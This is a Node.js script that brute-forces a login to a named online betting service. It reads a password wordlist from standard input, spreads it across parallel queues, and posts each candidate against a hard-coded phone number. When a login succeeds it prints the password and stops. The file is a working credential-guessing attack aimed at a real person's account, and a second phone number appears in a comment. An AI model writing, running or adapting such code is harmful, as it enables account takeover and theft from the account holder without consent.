var request = require("request");
///!Q@W#E$R%T^Y&U*I(O)P_{+}

var phone = '0707899230';//'0709079079';

var numCPUs = require('os').cpus().length;
//console.log(numCPUs);
var threads = numCPUs * 5;



d3 =require("d3-queue");
	var q = d3.queue();

var input_stdin = "";
var input_stdin_array = "";
var input_currentline = 0;

//startA();



function startA(){
process.stdin.resume();
process.stdin.setEncoding('ascii');
process.stdin.on('data', function (data) {
    input_stdin += data;
});

process.stdin.on('end', function () {
    input_stdin_array = input_stdin.split("\n");
	input_currentline =0;
	console.log("starting at " +input_currentline);
	
	
	
    main1();   
});
//process.on('SIGINT', function () {
 // console.log('Over and Out!');
 // process.exit(0);
// input_stdin_array = input_stdin.split("\n");
//    main(); 
//});
}
function readLine() {
    return input_stdin_array[input_currentline++];
}

/////////////// ignore above this line ////////////////////

function main1(){
	//main(input_stdin_array,0);
	//return;
	
	var l = input_stdin_array.length/threads;
	for(i =0;i<threads-1;i++){
		q.defer(function(arr){main(arr,0);},input_stdin_array.splice(0,l));
	}
	q.defer(function(arr){main(arr,0);},input_stdin_array);
	q.await(function(error) {
	console.log(error);
});
}


function main(arr,arr_currentline) {
	
	
	
    var n = arr.length;
//	for(x=0;x<n;x++){
//		var input = readLine();
		//console.log(`${input}`);
//	}
    //arr = readLine().split('');
    //arr = arr.map(Number);
	if(arr_currentline>= n){
		console.log("completed file");
		return;
	}
//console.log(arr);	
var input = arr[arr_currentline++].toString().trim(); //readLine().trim().toString();//encodeURI(
//input = input.replace(/(["])/g, "\\$1");
//input = input.replace(/(['])/g, "\\$1");
input =input.slice(0,10);
input = input.replace(/[`~!@#$%^&*()_|+\-=?;:'",.<>\{\}\[\]\\\/]/gi, '');

if(input.length <4){ //skip small passwords
	main(arr,arr_currentline);
	return;
}
function callbackM(input,callback){
	main(arr,arr_currentline);
}
crack(input,callbackM);
	
}
function crack(input,callback){
	
	
	var p = new Promise(function(resolve, reject) {
	// Do an async task async task and then...
	//POST https://sportpesa.com/bets/login/ password username
	//https://app.sportpesa.com:3031/player/v1/login  usr: '0724654695', pwd:`${input}` 
	

var options = { method: 'POST',  url: 'https://app.sportpesa.com:3031/player/v1/login',
  headers: 
   { 'postman-token': '1e0a1728-c694-33ab-9cb8-fc18dd6e36d1',
     'cache-control': 'no-cache',
     'content-type': 'multipart/form-data; boundary=---011000010111000001101001' },
  formData: { usr: phone, pwd:`${input}` } };
 console.log(options.formData);
request(options, function (error, response, body) {
  if (error) { console.log(error);resolve('next guy!');return;}//throw new Error(error);
  var jsonBody = JSON.parse(body);
  if(!jsonBody.errorDescription){//success
	jsonBody.password = options.formData.pwd;
	 console.log(jsonBody);
	 q.abort();
	  reject('complete!');
	 
  }
	  resolve('next guy!');return;
});

});

p.then(function() { 
	/* do something with the result */
	callback();//callback(arr,arr_currentline);
}).catch(function(a) {
	/* error :( */
	console.log("error " + a);
	 process.exit();
})
}

